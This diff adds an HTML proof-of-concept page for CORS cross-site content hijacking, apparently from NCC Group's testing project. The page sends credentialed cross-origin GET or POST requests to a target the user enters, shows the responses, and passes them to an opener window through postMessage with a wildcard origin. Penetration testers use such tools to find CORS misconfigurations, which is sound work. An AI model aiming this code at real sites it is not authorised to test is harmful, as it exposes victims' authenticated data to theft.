@@ -1,0 +1,219 @@
+<html>
+<head>
+	<title>CORS Cross-Site Content (Data) Hijacking (XSCH) PoC</title>
+	<script type="text/javascript">
+		// For https://github.com/nccgroup/CrossSiteContentHijacking
+		// Coomunication bit for Content Hijacking 
+		// This will not work in old browsers obviously
+		var windowSource;
+		function receiveMessage(e)
+		{
+			showInfo('CORS module has been loaded successfuly from ' + document.location ,1);
+			windowSource = e.source;
+			var message = e.data;
+			document.getElementById('target').value = message[0];
+			document.getElementById('postData').value = message[1];
+			loadData();
+		}
+		window.addEventListener("message", receiveMessage, false);
+	</script>
+	
+	<script defer>
+		if(window.opener){
+			windowSource = window.opener;
+			windowSource.postMessage('1','*');
+		}
+	</script>
+	<script>
+		// Generic functions
+		// function to create an XMLHttpClient in a cross-browser manner
+		function initXMLHttpClient(isFromSameOrigin) {
+			var xmlhttp;
+			try {
+				if(window.XDomainRequest && (typeof ((new XMLHttpRequest()).withCredentials))==='undefined'){
+					// IE - but not 10 and after!
+					// This doesn't have any respect for same origin though! It needs CORS headers.
+					// ActiveX should be used if it is from the same origin so we throw an error!
+					if(isFromSameOrigin) 
+						throw 'Hello to you too old but no so much wise IE!';
+					xmlhttp = new XDomainRequest(); 
+				}else{
+					xmlhttp = new XMLHttpRequest();
+				}
+			} catch (e) {
+				// Old IE - not really CROSy ;)
+				// from http://www.informit.com/articles/article.aspx?p=667416&seqNum=2
+				var XMLHTTP_IDS = new Array('MSXML2.XMLHTTP.5.0',
+				'MSXML2.XMLHTTP.4.0',
+				'MSXML2.XMLHTTP.3.0',
+				'MSXML2.XMLHTTP',
+				'Microsoft.XMLHTTP' );
+				var success = false;
+				for (var i=0;i < XMLHTTP_IDS.length && !success; i++) {
+					try {
+					xmlhttp = new ActiveXObject(XMLHTTP_IDS[i]);
+					success = true;
+					} catch (e) {}
+				}
+				//if (!success) {
+				//	throw new Error('Unable to create XMLHttpRequest.');
+				//}
+				
+			}
+			return xmlhttp;
+		}
+		
+		function loadData(){
+			var target = document.getElementById('target').value;
+			var postData = document.getElementById('postData').value;
+			if(!isBlank(target)){	
+				var xhttp = initXMLHttpClient(isFromSameOrigin(target));
+				if (xhttp){
+					if(typeof xhttp.onreadystatechange === 'object' || typeof xhttp.onreadystatechange === 'unknown'){
+						xhttp.onreadystatechange = function() {
+							if (xhttp.readyState == 4) {
+								showInfo(xhttp.responseText,0);
+							}
+						};
+					}else{
+						// when we have XDomainRequest
+						xhttp.onload = function() {
+							showInfo(xhttp.responseText,0);
+						};
+						
+						xhttp.onerror = function() {
+							showInfo(xhttp.responseText,0);
+						};
+					}
+					if(typeof xhttp.withCredentials === 'boolean'){
+						xhttp.withCredentials = true;
+					}else{
+						// We have an old IE?
+						showInfo('xhttp.withCredentials could not be used.',1);
+					}
+					
+					
+					if(!isBlank(postData)){
+						// POST request
+						xhttp.open("POST", target, true);
+						try{
+							xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+						}catch(e){
+							// We have XDomainRequest in IE!
+						}
+						xhttp.send(postData);
+					}else{
+						// GET request
+						xhttp.open("GET", target, true);
+						xhttp.send();
+					}
+					
+				}else{
+					showInfo('XML HTTP Request object could not be created.',1);
+				}
+			}else{
+				showInfo('Target is empty.',1);
+			}
+		}
+		
+		function showInfo(strData,strType){
+			document.getElementById('result').value += strData + '\r\n';
+			if(windowSource){
+				windowSource.postMessage([strData,strType],'*');
+			}
+		}
+		
+		function isBlank(str) {
+			return (!str || /^\s*$/.test(str));
+		}
+		
+		function isFromSameOrigin(strURL){
+			var result = true;
+			strURL = strURL.toLowerCase();
+			// we really don't want to check for @ or valid protocols or \ rather than / as this is a helper function not Inspector Gadget!
+			if (/^(\/\/.+)|(^[a-z]+:)/i.test(strURL)){
+				result = false;
+				var currentURL =  document.location.protocol + '//' + location.hostname+(location.port ? ':'+location.port: '');
+				if(!isBlank(document.location.port))
+					currentURL += ':'+document.location.port;
+				
+				var arr = strURL.split("/");
+				
+				if(arr.length>=3){
+					var tempURL = (arr[0] ? arr[0] : document.location.protocol) + '//' + arr[2];
+					currentURL = currentURL.toLowerCase();
+					tempURL = tempURL.toLowerCase();
+					if(tempURL===currentURL)
+						result = true;
+				}
+			}
+			return result;
+		}
+	</script>
+	<style type="text/css">
+		html, body {
+			font-family: verdana;
+			height: 100%;
+			overflow: auto;
+		}
+		body {
+			padding: 0;
+			margin: 0;
+		}
+		table {
+		/*	table-layout: fixed;*/
+			border-collapse: collapse;
+			border-spacing: 0;
+			width: 100%;
+		}
+		th {
+			font-family: verdana;
+			color: white;
+			vertical-align: middle;
+			background-color: black;
+		}
+		td {
+			font-family: verdana;
+			word-wrap:break-word;
+			height: 30px;
+			max-width: 600px;
+		}
+		#silverlightControlHost {
+			height: 100%;
+			text-align:center;
+		}
+		.info {
+			background: #ffff00;
+		}
+		.logdata:nth-last-child(2n-1) {
+			background: #ccc;
+		}
+		.logdata {
+			white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap;  word-wrap: break-word;
+			overflow:auto;
+			max-height: 300px;
+		}
+		.note {
+			font-family: courier;
+			font-size: 15px;
+		}
+    </style>
+</head>
+<body>
+	<table width=300>
+		<tr>
+			<td>Target:</td>
+			<td><input type="text" id="target" size="80" value="" /></td>
+		</tr>
+		<tr>
+			<td>POST Data:</td>
+			<td><input type="text" id="postData" size="80" value="" /></td>
+		</tr>
+		<tr colspan="2">
+			<td><input type="button" value="Fetch" onclick="loadData()" /></td>
+		</tr>	
+	</table>
+	Result:<br/>
+	<textarea cols=100 rows=20 id="result"></textarea>
+</body>
+</html>
